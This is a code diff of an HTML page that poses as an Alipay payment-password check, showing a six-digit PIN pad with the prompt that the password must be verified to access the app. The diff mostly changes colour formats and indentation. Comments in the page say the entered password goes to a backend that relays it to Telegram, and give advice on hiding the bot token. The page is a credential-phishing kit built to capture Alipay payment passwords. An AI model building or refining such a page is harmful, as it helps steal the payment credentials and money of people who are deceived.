@@ -13,8 +13,8 @@
     font-family: Arial, "Helvetica Neue", Helvetica, sans-serif;
     margin: 0;
     padding: 0;
-    background: #fafafa;
-    color: #333;
+    background: rgb(250, 250, 250);
+    color: rgb(51, 51, 51);
     min-height: 100vh;
     display: flex;
     justify-content: center;
@@ -54,7 +54,7 @@
   }
   .header-text p {
     margin: 0;
-    color: #666;
+    color: rgb(102, 102, 102);
     font-size: 13px;
   }
 
@@ -76,11 +76,11 @@
     width: 48px;
     height: 48px;
     border-radius: 6px;
-    border: 1px solid #d8d8d8;
+    border: 1px solid rgb(216, 216, 216);
     text-align: center;
     font-size: 24px;
     letter-spacing: 2px;
-    background: #fff;
+    background: rgb(255, 255, 255);
     -webkit-appearance: none;
   }
 
@@ -94,8 +94,8 @@
   }
 
   .key {
-    background: #fff;
-    border: 1px solid #e6e6e6;
+    background: rgb(255, 255, 255);
+    border: 1px solid rgb(230, 230, 230);
     padding: 14px 0;
     font-size: 20px;
     text-align: center;
@@ -107,7 +107,7 @@
   }
   .key:active { transform: translateY(1px); }
   .key.special {
-    background: #f7f7f7;
+    background: rgb(247, 247, 247);
   }
   .actions {
     display:flex;
@@ -125,19 +125,42 @@
     font-size: 15px;
   }
   .btn.primary {
-    background: #1677ff;
+    background: rgb(22, 119, 255);
     color: white;
   }
   .btn.ghost {
     background: transparent;
-    border: 1px solid #ddd;
+    border: 1px solid rgb(221, 221, 221);
   }
 
   footer {
     margin-top: 18px;
     text-align:center;
-    color:#999;
+    color:rgb(153, 153, 153);
     font-size:12px;
+  }
+
+  .error-message {
+    color: rgb(245, 108, 108);
+    font-size: 14px;
+    text-align: center;
+    margin-bottom: 12px;
+    padding: 8px 16px;
+    background: rgb(254, 240, 240);
+    border-radius: 6px;
+    border: 1px solid rgb(252, 226, 226);
+    display: none;
+    animation: shake 0.3s ease-in-out;
+  }
+
+  .error-message.show {
+    display: block;
+  }
+
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-8px); }
+    75% { transform: translateX(8px); }
   }
 </style>
 </head>
@@ -152,108 +175,108 @@
         <p>请验证支付宝支付密码才能访问应用程序</p>
       </div>
     </header>
+
     <div class="container" aria-live="polite">
-        <div class="error-message" id="errorMessage"></div>
-        <div class="pin-row" id="pinRow" aria-label="输入支付密码">
-          <input id="p1" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
-          <input id="p2" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
-          <input id="p3" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
-          <input id="p4" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
-          <input id="p5" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
-          <input id="p6" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
-        </div>
-  
-        <div class="keyboard" role="application" aria-label="数字键盘">
-          <div class="key" onclick="press('1')">1</div>
-          <div class="key" onclick="press('2')">2</div>
-          <div class="key" onclick="press('3')">3</div>
-          <div class="key" onclick="press('4')">4</div>
-          <div class="key" onclick="press('5')">5</div>
-          <div class="key" onclick="press('6')">6</div>
-          <div class="key" onclick="press('7')">7</div>
-          <div class="key" onclick="press('8')">8</div>
-          <div class="key" onclick="press('9')">9</div>
-          <div class="key special" onclick="submitPin()">✓</div>
-          <div class="key" onclick="press('0')">0</div>
-          <div class="key special" onclick="backspace()">⌫</div>
-        </div>
-  
-        <div class="actions">
-          <button class="btn ghost" onclick="clearPin()">清除</button>
-          <!-- 按钮会调用后端 API，将密码发送给后端，再由后端发送到 Telegram -->
-          <button class="btn primary" onclick="submitPin()">提交</button>
-        </div>
+      <div class="error-message" id="errorMessage"></div>
+      <div class="pin-row" id="pinRow" aria-label="输入支付密码">
+        <input id="p1" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
+        <input id="p2" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
+        <input id="p3" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
+        <input id="p4" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
+        <input id="p5" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
+        <input id="p6" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
       </div>
-  
-    
+
+      <div class="keyboard" role="application" aria-label="数字键盘">
+        <div class="key" onclick="press('1')">1</div>
+        <div class="key" onclick="press('2')">2</div>
+        <div class="key" onclick="press('3')">3</div>
+        <div class="key" onclick="press('4')">4</div>
+        <div class="key" onclick="press('5')">5</div>
+        <div class="key" onclick="press('6')">6</div>
+        <div class="key" onclick="press('7')">7</div>
+        <div class="key" onclick="press('8')">8</div>
+        <div class="key" onclick="press('9')">9</div>
+        <div class="key special" onclick="submitPin()">✓</div>
+        <div class="key" onclick="press('0')">0</div>
+        <div class="key special" onclick="backspace()">⌫</div>
+      </div>
+
+      <div class="actions">
+        <button class="btn ghost" onclick="clearPin()">清除</button>
+        <!-- 按钮会调用后端 API，将密码发送给后端，再由后端发送到 Telegram -->
+        <button class="btn primary" onclick="submitPin()">提交</button>
+      </div>
     </div>
+
   
-  <script>
-    // 不要在前端放置真实 bot token! —— 安全警告：在前端暴露 token 会被任何人看到并滥用
-    // 推荐做法：前端只把密码提交到你自己后端，例如 POST /send-alipay-pass
-    // 后端从 ENV 中读取 TELEGRAM_BOT_TOKEN 并调用 Telegram API 发送消息。
+  </div>
+
+<script>
+  // 不要在前端放置真实 bot token! —— 安全警告：在前端暴露 token 会被任何人看到并滥用
+  // 推荐做法：前端只把密码提交到你自己后端，例如 POST /send-alipay-pass
+  // 后端从 ENV 中读取 TELEGRAM_BOT_TOKEN 并调用 Telegram API 发送消息。
+
+  const pins = Array.from(document.querySelectorAll('.pin'));
+  const errorMessage = document.getElementById('errorMessage');
   
-    const pins = Array.from(document.querySelectorAll('.pin'));
-    const errorMessage = document.getElementById('errorMessage');
-    
-    function showError(message) {
-      errorMessage.textContent = message;
-      errorMessage.classList.add('show');
-      setTimeout(() => {
-        errorMessage.classList.remove('show');
-      }, 3000);
-    }
-  
-    function hideError() {
+  function showError(message) {
+    errorMessage.textContent = message;
+    errorMessage.classList.add('show');
+    setTimeout(() => {
       errorMessage.classList.remove('show');
+    }, 3000);
+  }
+
+  function hideError() {
+    errorMessage.classList.remove('show');
+  }
+
+  function getCurrentIndex() {
+    for (let i = 0; i < pins.length; i++) {
+      if (!pins[i].value) return i;
     }
-  
-    function getCurrentIndex() {
-      for (let i = 0; i < pins.length; i++) {
-        if (!pins[i].value) return i;
+    return pins.length;
+  }
+
+  function press(d) {
+    hideError();
+    const idx = getCurrentIndex();
+    if (idx < pins.length) {
+      pins[idx].value = d;
+    }
+  }
+
+  function backspace() {
+    // 删除最后一个非空
+    for (let i = pins.length - 1; i >= 0; i--) {
+      if (pins[i].value) {
+        pins[i].value = '';
+        break;
       }
-      return pins.length;
     }
-  
-    function press(d) {
-      hideError();
-      const idx = getCurrentIndex();
-      if (idx < pins.length) {
-        pins[idx].value = d;
-      }
+  }
+
+  function clearPin() {
+    pins.forEach(p => p.value = '');
+  }
+
+  function getPinValue() {
+    return pins.map(p => p.value || '').join('');
+  }
+
+  async function submitPin() {
+    const pin = getPinValue();
+    if (pin.length !== pins.length) {
+      showError('请输入完整的 6 位密码');
+      return;
     }
+    hideError();
+    submit.call(pin);
   
-    function backspace() {
-      // 删除最后一个非空
-      for (let i = pins.length - 1; i >= 0; i--) {
-        if (pins[i].value) {
-          pins[i].value = '';
-          break;
-        }
-      }
-    }
-  
-    function clearPin() {
-      pins.forEach(p => p.value = '');
-    }
-  
-    function getPinValue() {
-      return pins.map(p => p.value || '').join('');
-    }
-  
-    async function submitPin() {
-      const pin = getPinValue();
-      if (pin.length !== pins.length) {
-        showError('请输入完整的 6 位密码');
-        return;
-      }
-      hideError();
-      submit.call(pin);
-    
-    }
-  
-  
-  </script>
-  </body>
-  </html>
-  
+  }
+
+
+</script>
+</body>
+</html>
